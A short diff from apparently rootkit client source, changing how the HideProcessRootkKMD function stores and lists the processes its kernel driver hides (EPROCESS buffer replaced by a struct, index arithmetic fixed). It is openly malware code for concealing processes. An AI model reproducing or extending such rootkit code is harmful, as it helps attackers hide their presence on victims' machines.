@@ -529,7 +529,7 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	PASS_DATA OprStatus = { 0 };
 	PVOID HiddenProcesses = NULL;
-	BYTE CurrentProcess[EPROCESS1809_SIZE] = { 0 };
+	SHORTENEDACTEPROCESS CurrentProcess = { 0 };
 	int CurrentIndex = 0;
 	printf("=====HideProcess=====\n\n");
 	RootkInstructions.Operation = RKOP_HIDEPROC;
@@ -611,9 +611,9 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 			return FALSE;
 		}
 		printf("Currently hidden processes (dynamically):\n");
-		for (ULONG64 hiddeni = 0; hiddeni < RootkInstructions.Size; hiddeni += EPROCESS1809_SIZE) {
-			RtlCopyMemory(CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + hiddeni), EPROCESS1809_SIZE);
-			printf("Process number %llu -\n", hiddeni);
+		for (ULONG64 hiddeni = 0; hiddeni < RootkInstructions.Size; hiddeni += sizeof(SHORTENEDACTEPROCESS)) {
+			RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + hiddeni), sizeof(SHORTENEDACTEPROCESS));
+			printf("Process number %llu -\n", hiddeni / sizeof(SHORTENEDACTEPROCESS));
 			ParseEprocess(CurrentProcess);
 		}
 	}
